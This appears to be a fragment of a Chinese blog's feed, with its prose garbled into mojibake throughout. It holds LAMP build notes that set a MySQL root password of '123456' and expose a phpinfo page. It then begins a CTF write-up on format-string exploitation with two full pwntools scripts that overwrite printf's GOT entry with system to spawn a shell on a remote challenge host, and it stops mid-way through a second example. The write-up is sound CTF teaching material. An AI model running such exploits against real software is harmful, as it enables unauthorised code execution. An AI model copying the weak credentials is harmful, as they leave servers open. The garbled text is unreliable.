libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>å¦‚æœå‡ºç°ï¼š</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>è§£å†³åŠæ³• ï¼š </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //è¿›å…¥zlibç›®å½•[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #ä½¿ç”¨64ä½å…ƒçš„æ–¹æ³•è¿›è¡Œç¼–è¯‘[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>ç„¶ååœ¨é‡æ–°æ¥å®‰è£…libpngå³å¯ã€‚</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>æä¾›jpegæ ¼å¼çš„å›¾ç‰‡</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>å¦‚æœå‘ç”Ÿè¿™æ ·çš„æŠ¥é”™ï¼š</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtoolï¼šå‘½ä»¤æœªæ‰¾åˆ°make: *** [jcapimin.lo] é”™è¯¯ 127</code></pre><p>éœ€è¦ï¼š</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cpï¼šæ˜¯å¦è¦†ç›–&quot;./config.guess&quot;ï¼Ÿ yes[root@localhost jpeg-6b]# make clean</code></pre><p>é‡æ–°å†æ¥å°±å¥½ã€‚</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>å­—ä½“åº“ã€‚</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>ç»™phpæä¾›å›¾å½¢æ‹“å±•çš„åº“</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>è¿™æ ·ä¼šçˆ†ä¸€ä¸ªé”™ï¼Œç„¶åéœ€è¦æ”¹ä¸€ä¸‹æºç ï¼š</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>éœ€è¦æŒ‡å®šä¸€ä¸‹è·¯å¾„å³å¯ï¼Œè¿™ä¸ªåˆšåˆšæ˜¯å·²ç»å®‰è£…è¿‡çš„ã€‚</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>å…ˆè£…ä¸¤ä¸ªå·¥å…·åŒ…ï¼š</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="å¼€å§‹è£…httpedï¼š"><a href="#å¼€å§‹è£…httpedï¼š" class="headerlink" title="å¼€å§‹è£…httpedï¼š"></a>å¼€å§‹è£…httpedï¼š</h3><p>å…ˆè¿›å…¥è£…ä¸€ä¸‹pcreï¼š</p><pre><code>./configuremakemake install</code></pre><p>è¿›å…¥httpedï¼š<br>å…ˆå¯¹é…ç½®è¿›è¡Œè®¾ç½®ï¼š</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="å¼€æœåŠ¡ï¼š"><a href="#å¼€æœåŠ¡ï¼š" class="headerlink" title="å¼€æœåŠ¡ï¼š"></a>å¼€æœåŠ¡ï¼š</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨"><a href="#è‡ªå¯åŠ¨" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>è®¾ç½®å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨è¿™ä¸ªæœåŠ¡ã€‚</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="å‡†å¤‡å·¥ä½œ-1"><a href="#å‡†å¤‡å·¥ä½œ-1" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>è£…ä¸¤ä¸ªå·¥å…·ï¼š</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼š</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) ç»„=1001(mysql)</code></pre><p>å®‰è£…ncursesï¼š</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="å¼€å§‹å®‰è£…"><a href="#å¼€å§‹å®‰è£…" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="ç®€å•è®¾ç½®"><a href="#ç®€å•è®¾ç½®" class="headerlink" title="ç®€å•è®¾ç½®"></a>ç®€å•è®¾ç½®</h3><p>åˆå§‹åŒ–mysqlï¼š</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>è®¾ç½®æƒé™ï¼š</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>è¦†ç›–ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcpï¼šæ˜¯å¦è¦†ç›–&quot;/etc/my.cnf&quot;ï¼Ÿ yes</code></pre><p>æ¥ç€åˆå§‹åŒ–ï¼š</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p>å‘ç°å¡æ­»äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>æ€æ‰é‡æ–°æ¥ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="è‡ªå¯åŠ¨-1"><a href="#è‡ªå¯åŠ¨-1" class="headerlink" title="è‡ªå¯åŠ¨"></a>è‡ªå¯åŠ¨</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="è®¾ç½®mysqlå¯†ç "><a href="#è®¾ç½®mysqlå¯†ç " class="headerlink" title="è®¾ç½®mysqlå¯†ç "></a>è®¾ç½®mysqlå¯†ç </h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚æ³¨æ„ <code>history -c</code> æ¸…æ¥šå†å²è®°å½•å‘½ä»¤ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>æœåŠ¡éƒ½æ­£å¸¸ï¼Œå­—ç¬¦é›†æ ¼å¼ä¹Ÿåœ¨ã€‚</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="å‡†å¤‡å·¥ä½œ-2"><a href="#å‡†å¤‡å·¥ä½œ-2" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>è®©phpæ”¯æŒæ•°æ®åº“çš„å†…å®¹ï¼š</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="å¼€å§‹å®‰è£…-1"><a href="#å¼€å§‹å®‰è£…-1" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>å¤åˆ¶ä¸»é…ç½®æ–‡ä»¶åˆ°<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>ä¿®æ”¹apache2é…ç½®ï¼Œè®©å…¶ä¹Ÿå¯ä»¥æ”¯æŒphp</p><p>é‡å¯apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart å¯èƒ½æ˜¯æ— æ•ˆçš„ã€‚</p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><h4 id="apacheä¸php"><a href="#apacheä¸php" class="headerlink" title="apacheä¸php"></a>apacheä¸php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>å†™ä¸€ä¸ªphpæ¢é’ˆï¼š</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apacheä¸MySQL"><a href="#apacheä¸MySQL" class="headerlink" title="apacheä¸MySQL"></a>apacheä¸MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadminæ­å»º"><a href="#phpadminæ­å»º" class="headerlink" title="phpadminæ­å»º"></a>phpadminæ­å»º</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>è®¿é—®æµ‹è¯•ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lampæ­å»ºè®°å½•&quot;&gt;&lt;a href=&quot;#Lampæ­å»ºè®°å½•&quot; class=&quot;headerlink&quot; title=&quot;Lampæ­å»ºè®°å½•&quot;&gt;&lt;/a&gt;Lampæ­å»ºè®°å½•&lt;/h1&gt;&lt;h2 id=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</title>
    <link href="http://chumen77.xyz/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/04/03/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰/</id>
    <published>2020-04-03T08:59:50.107Z</published>
    <updated>2020-06-27T14:27:05.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥ç€ä¸Šä¸€ç¯‡ï¼Œè¿™ä¸€ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å’Œctfèµ›é¢˜ä¸­å¸¸è§çš„å¥—è·¯å’Œè€ƒæ³•ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Š</h2><h3 id="åŠ«æŒgot"><a href="#åŠ«æŒgot" class="headerlink" title="åŠ«æŒgot"></a>åŠ«æŒgot</h3><ul><li>æ¯æ¬¡ call libc ä¸­çš„å‡½æ•°æ—¶éƒ½ä¼šå»GOTè¡¨ä¸­æŸ¥è¯¢æ¥æ‰¾å‡ºç¨‹åºä¸‹ä¸€æ­¥è¦jmpçš„ä½å€</li><li>å¯ä»¥é€šè¿‡ fmt æ„é€ å†™å…¥ä¸€ä¸ªç›®æ ‡åœ°å€ï¼Œæ”¹æ‰ GOT è¡¨ä¸Šçš„åœ°å€ä½¿å¾—callè¯¥å‡½æ•°æ—¶å˜æˆjmpåˆ°æˆ‘ä»¬è¦çš„ç›®æ ‡åœ°å€å»<br>ä¾‹å¦‚ ï¼š<br>å°† printf æ”¹æˆ systemï¼ŒåŸæœ¬ printf (â€œshâ€™â€™ï¼‰å°±ç›´æ¥å˜æˆ system (â€œshâ€),ä¾¿å¯ä»¥æ‹¿åˆ°shellã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€æ”»å‡»è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</li><li>ç¡®å®šä¸€ä¸‹printfå‡½æ•°çš„GOTè¡¨çš„åœ°å€ï¼Œå¦‚å›¾ä¸­æ˜¯<code>0x804a010</code></li><li>ç¡®å®šä¸€ä¸‹systemå‡½æ•°çš„å†…å­˜åœ°å€æˆ–è€…pltï¼ˆé€šå¸¸éƒ½éœ€è¦æ³„æ¼ä¸€ä¸‹libcçš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Šåç§»ç®—å‡ºï¼Œå½“ç„¶ä¹Ÿä¼šé‡åˆ°ç¨‹åºç›´æ¥å­˜åœ¨systemå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯pltï¼‰</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfå‡½æ•°GOTè¡¨çš„åœ°å€</li><li>åˆ©ç”¨fmtæ¼æ´ä¿®æ”¹printfå‡½æ•°GOTè¡¨ä¸Šçš„åœ°å€</li></ul><p>ç„¶åçœ‹ä¸€ä¸ªä¾‹é¢˜ï¼š</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œé‚£å°±æ„å‘³ç€å¯ä»¥æ— é™æ¬¡è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å¹¶ä¸”è¿˜æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œé‚£å¯ä»¥ç›´æ¥æ‰¾å…¶pltã€‚</p><h6 id="æ”»å‡»æ€è·¯ï¼š"><a href="#æ”»å‡»æ€è·¯ï¼š" class="headerlink" title="æ”»å‡»æ€è·¯ï¼š"></a>æ”»å‡»æ€è·¯ï¼š</h6><ul><li>åœ¨æ ˆä¸Šæ”¾å¥½printfå‡½æ•°çš„GOTè¡¨åœ°å€ï¼Œå¹¶ç¡®å®šä¸€ä¸‹åç§»</li><li>æ”¹è¿™ä¸ªGOTä¸Šçš„åœ°å€ä¸ºsystemå‡½æ•°çš„plt</li><li>æ”¹å¥½ä¸€ä¼šï¼Œä¼ é€ä¸€ä¸ª<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></li></ul><p>åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæ”¹GOTè¡¨ä¸Šçš„å€¼<strong>è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥</strong>ï¼Œå¦åˆ™åªæ”¹ä¸€èˆ¬ç¨‹åºä¼šå‡ºç°æ— æ³•é¢„æ–™çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹<strong>å­—èŠ‚å¯¹é½</strong>ã€‚</p><h5 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>ç¡®å®šåç§»æ˜¯7ï¼Œä½†éœ€è¦æ³¨æ„å­—èŠ‚å¯¹é½ï¼Œæ‰“ç®—ä¸€ä¼šåœ¨å†™payloadæ—¶å€™ï¼Œå°±<code>().ljust</code>è¡¥æˆ0x20çš„<code>a</code>ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsä¸­é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ¨¡å—ä¸­çš„å‡½æ•°<code>fmtstr_payload</code>ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚ï¼ˆä¸è¿‡å¬è¯´pwntoolsçš„æ–°ç‰ˆæœ¬æ˜¯å·²ç»æ”¯æŒ64ä½äº†ï¼Œä½†æ˜¯æœ¬äººä¸€ç›´æ²¡æœ‰æ›´æ–°æˆåŠŸï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æµ‹è¯•ï¼‰</p><h3 id="åŠ«æŒretaddress"><a href="#åŠ«æŒretaddress" class="headerlink" title="åŠ«æŒretaddress"></a>åŠ«æŒretaddress</h3><p>é¡¾åæ€è®®ï¼Œå°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–ä¸²æ¼æ´æ¥ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦jmpçš„åœ°å€ã€‚å¸¸è§å¥—è·¯ï¼š</p><ul><li>jmpåˆ°å¸¦æœ‰<code>system(/bin/sh)</code> çš„åé—¨å‡½æ•°</li><li>ä¸å¼€nxä¿æŠ¤ï¼Œjmpåˆ°è‡ªå·±æ„é€ çš„shellcodeä¸Šã€‚</li><li>æå‰æ³„æ¼libcç®—å‡ºlibcçš„baseï¼Œjmpåˆ°onegadgetåœ°å€</li></ul><p>çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><h4 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme-k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme-k0</h4><h5 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE 